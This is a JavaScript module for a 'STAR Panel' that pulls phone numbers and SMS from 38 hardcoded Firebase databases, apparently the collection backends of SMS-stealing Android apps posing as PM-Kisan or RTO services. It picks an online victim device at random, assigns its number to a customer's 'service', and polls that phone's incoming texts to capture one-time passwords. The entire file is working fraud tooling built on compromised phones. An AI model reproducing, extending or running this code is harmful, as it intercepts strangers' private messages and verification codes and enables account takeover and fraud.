/**
 * STAR Panel Firebase SMS Integration
 * Fetches real phone numbers & SMS from 38 Firebase databases
 */

const axios = require('axios');

const DB_CONFIG = [
  { label: "DB-1",  type: "std", firebase: "https://ck-kumar3-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-2",  type: "std", firebase: "https://ckraj-7c86d-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-3",  type: "std", firebase: "https://mman-433ae-default-rtdb.firebaseio.com/csc6/All_User/" },
  { label: "DB-4",  type: "std", firebase: "https://ujjwal-malmala-2ae81-default-rtdb.asia-southeast1.firebasedatabase.app/19112024/All_User/" },
  { label: "DB-5",  type: "std", firebase: "https://pm-kisan-04-de0e4-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-6",  type: "std", firebase: "https://parkashbhai-default-rtdb.firebaseio.com/19112024/All_User/" },
  { label: "DB-7",  type: "std", firebase: "https://pm-kishan-31-ea1ac-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-8",  type: "std", firebase: "https://pm-kishan-a8-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-9",  type: "std", firebase: "https://randa-2609c-default-rtdb.firebaseio.com/csc6/All_User/" },
  { label: "DB-10", type: "std", firebase: "https://pm75-a64de-default-rtdb.firebaseio.com/csc6/All_User/" },
  { label: "DB-11", type: "std", firebase: "https://go-one-1b6b2-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-12", type: "std", firebase: "https://skkumar-2cb0e-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-13", type: "std", firebase: "https://mera-wala-71a5e-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-14", type: "std", firebase: "https://aaaa-b3749-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-15", type: "std", firebase: "https://kumarlive1-default-rtdb.firebaseio.com/omex/All_User/" },
  { label: "DB-16", type: "std", firebase: "https://maik-31440-default-rtdb.firebaseio.com/omex/All_User/" },
  { label: "DB-17", type: "std", firebase: "https://rahul-6bf55-default-rtdb.firebaseio.com/omex/All_User/" },
  { label: "DB-18", type: "std", firebase: "https://karishmacsc-42128-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-19", type: "std", firebase: "https://please-2b091-default-rtdb.firebaseio.com/20112024/All_User/" },
  { label: "DB-20", type: "std", firebase: "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-21", type: "std", firebase: "https://vdgdgd-80f1e-default-rtdb.firebaseio.com/19112024/All_User/" },
  { label: "DB-22", type: "std", firebase: "https://pm-kisan-01hfg-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-23", type: "std", firebase: "https://lalanashish2-default-rtdb.firebaseio.com/19112024/All_User/" },
  { label: "DB-24", type: "std", firebase: "https://kitter-rajk8-default-rtdb.firebaseio.com/19112024/All_User/" },
  { label: "DB-25", type: "std", firebase: "https://pm-kishan-24hguh-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-26", type: "std", firebase: "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-27", type: "std", firebase: "https://mmmm-f7678-default-rtdb.firebaseio.com/19112024/All_User/" },
  { label: "DB-28", type: "std", firebase: "https://myabtar-default-rtdb.firebaseio.com/csc1/All_User/" },
  { label: "DB-29", type: "std", firebase: "https://myabtar-default-rtdb.firebaseio.com/csc2/All_User/" },
  { label: "DB-30", type: "std", firebase: "https://myabtar-default-rtdb.firebaseio.com/csc3/All_User/" },
  { label: "DB-31", type: "std", firebase: "https://myabtar-default-rtdb.firebaseio.com/csc4/All_User/" },
  { label: "DB-32", type: "std", firebase: "https://pm-kisan-28hhj-default-rtdb.firebaseio.com/Rahul7678/All_User/" },
  { label: "DB-33", type: "std", firebase: "https://pm-kisan-13bguh-default-rtdb.firebaseio.com/csc5/All_User/" },
  { label: "DB-34", type: "std", firebase: "https://pm-kisan-30jgj-default-rtdb.firebaseio.com/Rahul7678/All_User/" },
  { label: "DB-35", type: "std", firebase: "https://pm-modi-22dh-default-rtdb.firebaseio.com/Rahul7678/All_User/" },
  { label: "DB-36", type: "std", firebase: "https://radhe-d31aa-default-rtdb.firebaseio.com/24kacscshoot/All_User/" },
  { label: "DB-37", type: "rto", firebase: "https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app/" },
  { label: "DB-38", type: "duu", firebase: "https://duuu-dc41d-default-rtdb.firebaseio.com/" },
];

// Track numbers currently in use: phoneNumber -> { since, userId }
const numbersInUse = new Map();

// Cache of available numbers: refreshed periodically
let availableNumbersCache = [];
let lastCacheTime = 0;
const CACHE_TTL = 3 * 60 * 1000; // 3 minutes

async function fbFetch(url, timeout = 8000) {
  try {
    const { data } = await axios.get(url, {
      timeout,
      headers: { 'Accept': 'application/json' },
    });
    return data;
  } catch {
    return null;
  }
}

function cleanNum(raw) {
  if (!raw || raw === 'N/A' || !String(raw).trim()) return null;
  let d = String(raw).split('-')[0].trim().replace(/\D/g, '');
  if (d.length === 12 && d.startsWith('91')) d = d.slice(2);
  else if (d.length === 11 && d.startsWith('0')) d = d.slice(1);
  return d.length === 10 ? d : null;
}

async function fetchNumbersFromStd(db) {
  const [info, sim] = await Promise.all([
    fbFetch(db.firebase + 'Info.json'),
    fbFetch(db.firebase + 'SimINFO.json'),
  ]);

  const entries = [];
  if (!info || !sim) return entries;

  for (const [did, s] of Object.entries(sim || {})) {
    if (!s || typeof s !== 'object') continue;
    const inf = info[did];
    if (!inf || inf.status !== 'Online') continue;

    for (const k of ['sim1', 'sim2']) {
      const num = cleanNum(s[k]);
      if (!num) continue;
      entries.push({
        phoneNumber: num,
        did,
        firebase: db.firebase,
        label: db.label,
        type: 'std',
        adminKey: '',
        battery: inf.Battery || '?',
        brand: inf.brand || '',
      });
    }
  }
  return entries;
}

async function fetchNumbersFromRto(db) {
  const di = await fbFetch(db.firebase + 'DIVICEINFO.json', 10000);
  const entries = [];
  if (!di) return entries;

  for (const [did, info] of Object.entries(di)) {
    if (!info) continue;
    const isOn = (info.status?.state || '').toLowerCase() === 'online';
    if (!isOn) continue;

    for (const k of ['sim1', 'sim2']) {
      const num = cleanNum(info[k]);
      if (!num) continue;
      entries.push({
        phoneNumber: num,
        did,
        firebase: db.firebase,
        label: db.label,
        type: 'rto',
        adminKey: '',
        battery: (info.battery || '?').replace('%', ''),
        brand: info.brand || '',
      });
    }
  }
  return entries;
}

async function fetchNumbersFromDuu(db) {
  const ash = await fbFetch(db.firebase + 'admin.json?shallow=true', 10000);
  const entries = [];
  if (!ash) return entries;

  const NOW = Date.now(), THR = 10 * 60 * 1000;

  for (const akey of Object.keys(ash)) {
    const ush = await fbFetch(`${db.firebase}admin/${akey}/users.json?shallow=true`, 7000);
    if (!ush) continue;

    for (const uid of Object.keys(ush)) {
      const full = await fbFetch(`${db.firebase}admin/${akey}/users/${uid}.json`, 7000);
      if (!full || !(full.simInfo || full.heartbeat)) continue;
      const isOn = (NOW - (full.heartbeat || 0)) < THR;
      if (!isOn) continue;

      const si = full.simInfo || {};
      for (const sk of ['sim1', 'sim2']) {
        const num = cleanNum((si[sk] || {}).number);
        if (!num) continue;
        entries.push({
          phoneNumber: num,
          did: uid,
          firebase: db.firebase,
          label: db.label,
          type: 'duu',
          adminKey: akey,
          battery: '?',
          brand: (full.deviceInfo || {}).brand || '',
          carrier: (si[sk] || {}).carrierName || '',
        });
      }
    }
  }
  return entries;
}

async function refreshAvailableNumbers() {
  console.log('🔄 Refreshing available numbers from Firebase DBs...');
  const all = [];

  const results = await Promise.allSettled(
    DB_CONFIG.map(db => {
      if (db.type === 'rto') return fetchNumbersFromRto(db);
      if (db.type === 'duu') return fetchNumbersFromDuu(db);
      return fetchNumbersFromStd(db);
    })
  );

  for (const r of results) {
    if (r.status === 'fulfilled' && Array.isArray(r.value)) {
      all.push(...r.value);
    }
  }

  availableNumbersCache = all;
  lastCacheTime = Date.now();
  console.log(`✅ Found ${all.length} numbers across ${DB_CONFIG.length} DBs`);
  return all;
}

async function getAvailableNumbers() {
  if (Date.now() - lastCacheTime > CACHE_TTL || availableNumbersCache.length === 0) {
    await refreshAvailableNumbers();
  }
  return availableNumbersCache;
}

async function getNumberForService() {
  const numbers = await getAvailableNumbers();

  // Filter out numbers currently in use
  const available = numbers.filter(n => !numbersInUse.has(n.phoneNumber));

  if (available.length === 0) {
    throw new Error('No numbers available right now. Please try again in a moment.');
  }

  // Pick a random available number
  const picked = available[Math.floor(Math.random() * available.length)];
  numbersInUse.set(picked.phoneNumber, { since: Date.now() });

  return {
    phoneNumber: picked.phoneNumber,
    activationId: `${picked.did}_${picked.label}_${Date.now()}`,
    entry: picked,
  };
}

function releaseNumber(phoneNumber) {
  numbersInUse.delete(phoneNumber);
}

// Auto-release numbers after 10 minutes
setInterval(() => {
  const now = Date.now();
  for (const [num, data] of numbersInUse.entries()) {
    if (now - data.since > 10 * 60 * 1000) {
      numbersInUse.delete(num);
    }
  }
}, 60000);

async function getSmsForNumber(entry, sinceTimestamp = 0) {
  const { firebase, did, type, adminKey } = entry;
  const msgs = [];

  try {
    if (type === 'std') {
      const data = await fbFetch(`${firebase}Sms/${did}.json`, 8000);
      if (data && typeof data === 'object') {
        for (const [k, v] of Object.entries(data)) {
          if (!v || typeof v !== 'object') continue;
          const ts = parseInt(v.date || v.timestamp || 0);
          if (ts && ts < sinceTimestamp) continue;
          const text = v.msg || v.body || v.Body || v.message || v.sms || '';
          if (!text) continue;
          msgs.push({ key: k, text, sender: v.ph || v.address || v.sender || '', ts });
        }
      }
    } else if (type === 'rto') {
      const data = await fbFetch(`${firebase}sms.json`, 12000);
      if (data && typeof data === 'object') {
        for (const [k, v] of Object.entries(data)) {
          if (!v || v.deviceId !== did) continue;
          const ts = parseInt(v.timestamp || v.time || 0);
          if (ts && ts < sinceTimestamp) continue;
          const text = v.message || v.msg || '';
          if (!text) continue;
          msgs.push({ key: k, text, sender: v.sender || '', ts });
        }
      }
    } else if (type === 'duu') {
      const data = await fbFetch(`${firebase}admin/${adminKey}/users/${did}/receivedSms.json`, 8000);
      if (data && typeof data === 'object') {
        for (const [k, v] of Object.entries(data)) {
          if (!v || typeof v !== 'object') continue;
          const ts = parseInt(v.timestamp || 0);
          if (ts && ts < sinceTimestamp) continue;
          const text = v.message || v.msg || '';
          if (!text) continue;
          msgs.push({ key: k, text, sender: v.sender || '', ts });
        }
      }
    }
  } catch (err) {
    console.error('getSmsForNumber error:', err.message);
  }

  msgs.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  return msgs;
}

async function pollForOtp(entry, startTime, timeoutMs = 300000) {
  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      if (Date.now() - startTime > timeoutMs) {
        clearInterval(interval);
        resolve(null);
        return;
      }

      try {
        const msgs = await getSmsForNumber(entry, startTime - 30000); // 30s buffer
        if (msgs.length > 0) {
          clearInterval(interval);
          resolve(msgs[0]); // Return latest SMS
        }
      } catch {}
    }, 5000);
  });
}

module.exports = {
  DB_CONFIG,
  getNumberForService,
  releaseNumber,
  getSmsForNumber,
  pollForOtp,
  refreshAvailableNumbers,
  getAvailableNumbers,
  numbersInUse,
};
